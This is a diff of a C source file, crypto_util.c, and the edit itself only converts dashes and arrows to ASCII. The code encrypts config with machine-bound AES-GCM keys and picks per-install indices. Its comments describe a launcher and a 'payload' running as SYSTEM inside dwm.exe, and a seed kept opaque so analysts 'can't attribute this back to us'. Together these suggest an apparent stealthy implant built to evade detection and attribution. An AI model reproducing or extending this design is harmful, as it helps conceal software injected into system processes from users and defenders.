@@ -1,5 +1,5 @@
 /* ================================================================== *
- * crypto_util.c — BCrypt wrapper for the primitives we need.          *
+ * crypto_util.c -- BCrypt wrapper for the primitives we need.          *
  * ================================================================== */
 
 #include "common.h"
@@ -132,10 +132,10 @@ static int build_wrap_key(void) {
         RegCloseKey(k);
     }
 
-    /* Hostname only — MUST NOT use GetUserNameA because launcher runs
+    /* Hostname only -- MUST NOT use GetUserNameA because launcher runs
      * as interactive user but payload runs as SYSTEM (inside dwm.exe).
      * Including username would make the wrap keys differ between the two
-     * → payload can't decrypt config written by launcher. */
+     * -> payload can't decrypt config written by launcher. */
     char host[128] = {0};
     DWORD hlen = sizeof(host);
     GetComputerNameA(host, &hlen);
@@ -161,7 +161,7 @@ static int build_wrap_key(void) {
     return ok;
 }
 
-/* AES-256-GCM encrypt plain → out. Layout: iv[12] || tag[16] || ct[N].
+/* AES-256-GCM encrypt plain -> out. Layout: iv[12] || tag[16] || ct[N].
  * Returns 1 + fills *out_len on success. */
 int cu_wrap_encrypt(const void *plain, size_t plain_len,
                     uint8_t *out, size_t outmax, size_t *out_len) {
@@ -205,7 +205,7 @@ done:
     return ok;
 }
 
-/* Deterministic per-install pool-index picker — see header doc. */
+/* Deterministic per-install pool-index picker -- see header doc. */
 unsigned cu_installsalt_index(const char *salt, unsigned n) {
     if (n == 0) return 0;
     if (n == 1) return 0;
@@ -214,7 +214,7 @@ unsigned cu_installsalt_index(const char *salt, unsigned n) {
      * ≤ 64 chars). Both are stable per install AND identical across
      * launcher (interactive user) and payload (SYSTEM in dwm.exe), so
      * every callsite converges on the same index on the same machine.
-     * Deliberately omitting GetUserName — inside dwm.exe it's always
+     * Deliberately omitting GetUserName -- inside dwm.exe it's always
      * SYSTEM which erases user-side entropy. Salt discriminates callsites. */
     char mg[128] = {0};
     HKEY k;
@@ -237,7 +237,7 @@ unsigned cu_installsalt_index(const char *salt, unsigned n) {
     if (NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0))) {
         BCRYPT_HASH_HANDLE h;
         if (NT_SUCCESS(BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0))) {
-            /* Domain-separator seed — deliberately opaque so a strings
+            /* Domain-separator seed -- deliberately opaque so a strings
              * dump can't attribute this back to us. Any string works as
              * long as it stays stable across releases (rotating the
              * seed changes every install's picked index). */
@@ -263,7 +263,7 @@ unsigned cu_installsalt_index(const char *salt, unsigned n) {
             | ((uint32_t)digest[2] << 16)
             | ((uint32_t)digest[3] << 24);
     } else {
-        /* SHA256 unavailable — fall back to (pid ^ tick) so we still
+        /* SHA256 unavailable -- fall back to (pid ^ tick) so we still
          * return a valid index. Not per-install-stable in this branch,
          * but that only trips on catastrophic BCrypt failure which
          * means far bigger problems than an unstable window class. */
